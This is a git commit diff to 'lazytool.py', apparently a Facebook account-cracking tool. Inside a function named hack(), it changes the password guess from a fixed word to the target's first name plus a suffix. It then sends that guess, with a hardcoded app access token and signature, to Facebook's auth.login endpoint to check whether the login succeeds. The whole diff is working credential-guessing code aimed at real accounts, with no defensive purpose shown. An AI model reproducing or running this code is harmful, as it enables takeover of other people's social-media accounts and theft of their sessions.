aa44cc3e021d3b6eaa8ec9e29af6be0f30d09e73
Ara Software <71103842+cr4ck3r1@users.noreply.github.com>
2021-01-15 20:14:03 +0300

    Update lazytool.py

--- lazytool.py
+++ lazytool.py
@@ -310,7 +310,7 @@ def hack():
             try:
                 a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                 b = json.loads(a.text)
-                pass1 = 'Pakistan'
+                pass1 = b['first_name'] + 'hawlere' or ' hawlere'
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
